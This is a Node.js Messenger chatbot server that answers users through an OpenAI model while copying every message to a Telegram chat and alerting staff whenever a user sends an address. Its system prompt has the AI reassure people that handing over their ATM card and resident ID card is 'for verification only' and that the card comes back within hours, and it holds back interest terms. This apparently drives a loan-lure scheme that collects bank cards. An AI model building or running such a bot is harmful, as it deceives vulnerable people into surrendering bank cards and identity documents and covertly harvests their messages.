const express = require("express");
const bodyParser = require("body-parser");
const axios = require("axios");

const app = express().use(bodyParser.json());

// ==============================
// TOKENS
// ==============================
const PAGE_ACCESS_TOKEN = process.env.PAGE_ACCESS_TOKEN;
const VERIFY_TOKEN = process.env.VERIFY_TOKEN;
const OPENAI_API_KEY = process.env.OPENAI_API_KEY;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ==============================
// VERIFY WEBHOOK
// ==============================
app.get("/webhook", (req, res) => {
  const mode = req.query["hub.mode"];
  const token = req.query["hub.verify_token"];
  const challenge = req.query["hub.challenge"];

  if (mode === "subscribe" && token === VERIFY_TOKEN) {
    return res.status(200).send(challenge);
  }
  return res.sendStatus(403);
});

// ==============================
// RECEIVE FACEBOOK MESSAGE
// ==============================
app.post("/webhook", async (req, res) => {
  const body = req.body;

  if (body.object === "page") {
    body.entry.forEach(entry => {
      entry.messaging.forEach(event => {
        if (event.message?.is_echo) return;
        if (!event.message?.text) return;
        handleMessage(event.sender.id, event.message.text);
      });
    });
    return res.status(200).send("EVENT_RECEIVED");
  }
  return res.sendStatus(404);
});

// ==============================
// OPENAI
// ==============================
async function askAI(userText) {
  const res = await axios.post(
    "https://api.openai.com/v1/chat/completions",
    {
      model: "gpt-4o-mini",
      temperature: 0.2,
      messages: [
        {
          role: "system",
          content: `
You are a customer support assistant.

Reply ONLY in English.
NEVER reply in Vietnamese.

Style:
- Short
- Friendly
- One question max

Rules:
- You may explain the support and disbursement process.
- Do NOT promise approval.
- Do NOT mention interest unless user asks.
- ARC and ATM are for verification only.
- ATM will be returned within 6–12 hours.
`
        },
        { role: "user", content: userText }
      ]
    },
    {
      headers: {
        Authorization: \`Bearer \${OPENAI_API_KEY}\`,
        "Content-Type": "application/json"
      }
    }
  );

  return res.data.choices[0].message.content;
}

// ==============================
// HANDLE MESSAGE
// ==============================
async function handleMessage(sender_psid, text) {
  const msg = text.trim();

  // Log all customer messages to Telegram
  await sendToTelegram(`📩 FB: ${msg}`);

  // Detect address keywords → notify CSKH
  const isAddress =
    /taipei|new taipei|taichung|tainan|kaohsiung|city|district|street|road|jalan|kota|區|市|縣/i.test(
      msg
    );

  if (isAddress) {
    await sendToTelegram(
      `🚨 CSKH ALERT\nCustomer sent location:\n${msg}\n➡️ Please contact the customer.`
    );
  }

  // AI reply
  let reply;
  try {
    reply = await askAI(msg);
  } catch (e) {
    reply =
      "We can help support and guide you through the process. How can we help you today?";
  }

  sendMessage(sender_psid, { text: reply });
}

// ==============================
// SEND FACEBOOK MESSAGE
// ==============================
function sendMessage(sender_psid, response) {
  axios
    .post(
      "https://graph.facebook.com/v17.0/me/messages",
      {
        recipient: { id: sender_psid },
        message: response
      },
      { params: { access_token: PAGE_ACCESS_TOKEN } }
    )
    .catch(err =>
      console.error("FB ERROR:", err.response?.data || err.message)
    );
}

// ==============================
// TELEGRAM
// ==============================
function sendToTelegram(text) {
  return axios.post(
    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
    { chat_id: TELEGRAM_CHAT_ID, text }
  );
}

// ==============================
// START SERVER
// ==============================
app.listen(3000, () => console.log("Server chạy rồi OK ✔"));
